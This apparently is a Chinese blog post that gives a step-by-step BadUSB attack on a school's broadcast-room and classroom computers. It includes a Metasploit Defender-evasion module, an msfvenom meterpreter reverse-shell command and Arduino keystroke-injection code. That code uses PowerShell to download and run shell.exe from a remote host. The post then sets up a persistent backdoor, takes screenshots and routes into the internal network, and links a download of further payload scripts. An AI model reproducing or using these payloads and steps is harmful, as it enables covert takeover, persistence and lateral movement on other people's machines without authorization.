---
title: "携Badusb进校园的系列测试"
date: 2023-05-27T9:56:07+08:00
draft: true
description: 
keywords:
license:
weight: 0
tags:
  - 物理硬件
categories:
  - 近源渗透
---

<!--more-->

## **本文所用到的工具**：

l **Badusb**

l **Ngrok**

l **Arduino**

l **Msfconsole**

l **Msfvenom**

l **迷你相机**

## **蓄谋已久的前言**：

每次上楼时，都能看见广播室门开得非常宽，

![图片1](https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271002790.jpg)

**但这不是重点，重点是里面的电脑（****Windows XP****），电脑桌面上是****LED****大屏幕的编辑软件。**

![image-20230527100239072](https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271002109.png)

**二楼有个网络管理箱并由管道内的网线传输到每个教室的多媒体（****Windows 10****）。**

![image-20230527100252356](https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271002388.png)

看看兜里的****Badusb****，突然就散发出了浓浓的香味，哧溜。

**俗话说“艺高人胆大”，但吾也要：武艺不高强，菜鸟也先飞！**

![image-20230527100304344](https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271003372.png)

##  **分析并整理收集到的信息**

| **主机**   | **系统**       | **杀毒软件**          | **网络状态** |
| ---------- | -------------- | --------------------- | ------------ |
| **广播室** | **Windows XP** | **不详**              | **不详**     |
| **多媒体** | **Windows 10** | **Defender****、360 | **正常**     |

**而且我们从二楼的网络管理箱分支网线的管道可推断出二楼所有教师的多媒体属于同一内网。我们在烧录代码的时候，就要根据不同的系统版本，网络状态，杀毒软件等因素来进行烧录。为什么说广播室的具体信息我们获取不到呢？因为“可远观，而不可亵玩焉。”**

![image-20230527100334923](https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271003957.png)

##  **部署Payload及规避模块到Ngrok**

**首先我们使用规避模块生成一个**Windows EXE**文件来规避**Windwos Defender**程序，操作如下：**
```sh
show evasuibd
```
![image-20230527100354377](https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271003408.png)

```sh
use windows/windows_defender_exe

show options
```

![image-20230527100506186](https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271005210.png)

**接着run** **可以看到生成的****FILE NAME****（文件名是随机的）**

**当然也可以自定义** **Set FILENAME** **文件名即可**

**生成的文件保存到了**
```
/root/.msf4/local/yZdsypg.exe
```
**接下来我们来部署反弹环境**

**在**[这里](http://www.ngrok.cc)**来注册一个账户**

**登录后来到后台页面点击**

![image-20230527100520777](https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271005800.png)

**当然也有免费的隧道，不过网速较慢，根据自己的情况而定！**

![image-20230527100534238](https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271005258.png)

**接着我们点击立即购买，会跳转到隧道配置的页面，如图：**

![image-20230527100544553](https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271005575.png)

**使用**ping**服务器地址命令，找到**IP**地址。**

![image-20230527100556789](https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271005816.png)

**接着我们打开刚解压下来的文件夹**

**输入**./sunny clientid **填写你的隧道ID**

![image-20230527100606509](https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271006535.png)

**出现这个界面就代表隧道连接成功！**

![image-20230527100624124](https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271006145.png)

**接着我们用Msfvenom生成可执行文件,代码如下：**

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=平台给出的IP LPORT=平台给出的端口 -e x86/shikata_ga_nai -b "\x00" -i 5 -a x86 --platform win PrendMigrate=true PrendMigrateProc=svchost.exe -f exe -o /root/shell.exe
```

注：如果是64位系统，Payload则更改为：windows/x64/meterpreter/reverse_tcp对于小白很陌生带两个值是可以实现自动迁移进程的功能，关闭其中一进程并不影响另一进程。

-k选项并不适用于所有模板，请提前做好测试。

##  **安装Arduino**

**首先我们打开****arduino****安装包**

![image-20230527100811363](https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271008384.png)

![image-20230527100815346](https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271008365.png)

![image-20230527100819320](https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271008341.png)

![image-20230527100823362](https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271008382.png)

![image-20230527100826999](https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271008024.png)

**完成了安装。**

**配置如下：**

![image-20230527100836501](https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271008524.png)

完成安装。

![image-20230527100849268](https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271008300.png)

##  **烧录代码**

**代码贴出**：

```shell
#include <Keyboard.h>
void setup() {//初始化
  Keyboard.begin();//开始键盘通讯 
  delay(5000);//延时
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  delay(500); 
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.println("CMD.EXE /t:01 /k MODE con: cols=16 lines=2");
  delay(1000);
  Keyboard.println("POWERSHELL -cOMMAND $CLNT = NEW-OBJECT sYSTEM.nET.wEBcLIENT;$URL= 'http://ip/shell.exe';$FILE = ' c:\\SHELL.EXE ';$CLNT.dOWNLOADfILE($URL,$FILE);");
  delay(3000);
  Keyboard.println("C:\\SHELL.EXE&EXIT");
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();//结束键盘通讯 
}
void loop()//循环
{
}

```

![image-20230527100923342](https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271009369.png)

更多代码在文章底部有相关信息，不要着急！

**编译好之后我们直接上传即可完成烧录，直接点击上传可以检查编译并上传。**

##  **Shell快到碗里来**

![image-20230527100942749](https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271009772.png)

**让基友给我赶烧：**

![image-20230527101008879](https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271010902.png)

**如图：**

![image-20230527101016985](https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271010010.png)

**我们已经获取到了****Meterpreter****会话，现在我们可以为所欲为了！**

**为了防止亡羊补牢，要一劳永逸，我们先添加一个持久后门，命令如下：**

```sh
run persistence -X -i 5 -p 端口 -r IP
或者
run metsvc
```

**第二种方法直接监听即可，具体方法找谷哥和度娘。**

![image-20230527101110186](https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271011208.png)

**附带一张屏幕截图：**

```
screenshot
```

![image-20230527101127573](https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271011598.png)

**打开偷窥一下：**

![image-20230527101137573](https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271011626.png)

##  **内网漫游**

![image-20230527101147676](https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271011699.png)

**查看子网：**

```sh
查看子网：
run get_local_subnets
添加路由：
route add 子网 掩码 会话id
查看路由：
route print
自动化添加路由：
load auto_add_route
```

![image-20230527101214707](https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271012737.png)

**额**.......好吧 得退出meterpreter会话，因不可描述因素，就这样吧。

提示得运行一个Post模块，并且添加参数，大家明白就好。

**设置完毕后接下来就看自己的操作了，**

**广播室也被搞定，也是因不可描述规章制度等原因不再继续。**

**正文到此结束。**



## **总结**

1.要提前知晓操作系统。

2.根据不同的系统要构造不同的Payload。

3.采用多种可执行后缀（**bat**、**exe**、**docx**）。

4.获取**Shell**要第一时间添加后门。

5.**不推荐使用**Ngrok，自行百度其他平台，但使用方法基本一致。

6.**添加完路由如果有网络异常状态，则删除路由条目。**

**代码以烧录器整理集合如下：**

(**均来自互联网、适用与否请提前在虚拟机测试**)

**打开烧录脚本软件，点击文件**--打开即可。


{{< link href="https://pan.baidu.com/s/17UCyKosBkjCRb7IBfxfdPg " content=" 提取码：btmz " download="安装包" card=true >}}

 

>注：本文仅供参考，内容仅为虚构，代码以及使用方法切勿使用于非法用途！

>原创文章-[原文链接](https://mp.weixin.qq.com/s/pD31fhn00LQ4MWBmTHy1nQ)
